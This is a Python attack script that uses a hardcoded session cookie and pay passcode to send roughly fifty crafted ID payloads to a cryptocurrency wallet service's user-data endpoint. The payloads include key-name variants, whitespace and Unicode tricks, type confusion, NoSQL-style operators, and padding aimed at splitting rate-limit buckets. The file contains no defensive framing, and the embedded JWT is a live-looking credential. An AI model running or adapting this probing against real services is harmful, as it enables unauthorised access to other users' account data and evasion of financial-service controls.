import asyncio
from attack import CWalletClient
from coin import COINS
import logging
from logging.handlers import RotatingFileHandler


cookie = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNjk2MzJ6eXdxemJuNTlweXRpcmc2dW9xZHNiY3A5eSIsInNlc3Npb25faWQiOiI0MDk2eGpmaG15c3gzN2d6OG5lY2kxMW9vd3FiNnkiLCJwbGF0Zm9ybSI6ImVtYWlsIiwicm9sZXMiOiIiLCJwcm9wcyI6eyJib3RJZCI6IiIsImhlYWRVcmwiOiIiLCJuaWNrbmFtZSI6IiJ9LCJleHAiOjE4MzUyNTc2MDgsImlhdCI6MTc3MjE4NTYwOH0.qmlWE30IpS5xQQgjGaOyHNjKOfRR_TXaQOK3oVIZ39U" # john
client = CWalletClient(authCookie=cookie, payPassCode="111111")

async def test():

    VALID = "72563418"

    payloads = [

        # =========================
        # 1️⃣ Canonical
        # =========================
        {"id": VALID},

        # =========================
        # 2️⃣ Alternative key names
        # =========================
        {"user_id": VALID},
        {"uid": VALID},
        {"uuid": VALID},
        {"account_id": VALID},
        {"member_id": VALID},
        {"userId": VALID},
        {"Id": VALID},
        {"ID": VALID},

        # =========================
        # 3️⃣ Normalization tricks
        # =========================
        {"id": VALID + " "},
        {"id": " " + VALID},
        {"id": VALID + "\n"},
        {"id": VALID + "\t"},
        {"id": VALID + "\r\n"},
        {"id": "0" + VALID},
        {"id": VALID.lstrip("0")},
        {"id": VALID + "\x00"},

        # =========================
        # 4️⃣ Unicode edge cases
        # =========================
        {"id": VALID + "\u200b"},   # zero-width space
        {"id": VALID + "\u00a0"},   # non-breaking space
        {"id": VALID + "\u2028"},   # unicode line separator

        # =========================
        # 5️⃣ Type confusion
        # =========================
        {"id": int(VALID)},
        {"id": float(VALID)},
        {"id": True},
        {"id": str(int(VALID))},

        # =========================
        # 6️⃣ Structural variations
        # =========================
        {"id": [VALID]},
        {"id": [VALID, VALID]},
        {"id": {"value": VALID}},
        {"id": {"$eq": VALID}},
        {"id": {"id": VALID}},

        # =========================
        # 7️⃣ Batch / multi-value attempts
        # =========================
        {"id": f"{VALID},{VALID}"},
        {"id": f"{VALID}|{VALID}"},
        {"id": f"{VALID} {VALID}"},
        {"id": f"{VALID};{VALID}"},

        # =========================
        # 8️⃣ Extra ignored fields (bucket split attempts)
        # =========================
        {"id": VALID, "x": "1"},
        {"id": VALID, "x": "2"},
        {"id": VALID, "padding": "A"},
        {"id": VALID, "padding": "A"*10},
        {"id": VALID, "padding": "A"*100},
        {"id": VALID, "nonce": "abc"},
        {"id": VALID, "timestamp": "123456"},
        {"id": VALID, "random": "xyz"},

        # =========================
        # 9️⃣ Different key order (hash split attempt)
        # =========================
        {"a": 1, "id": VALID},
        {"id": VALID, "a": 1},
    ]
    
    for payload in payloads:
        try:
            print("Testing:", payload)
            response = await client.getUserDataByPayload(payload)
            print("Response:", response)
        except Exception as e:
            print("Error:", e)

asyncio.run(test())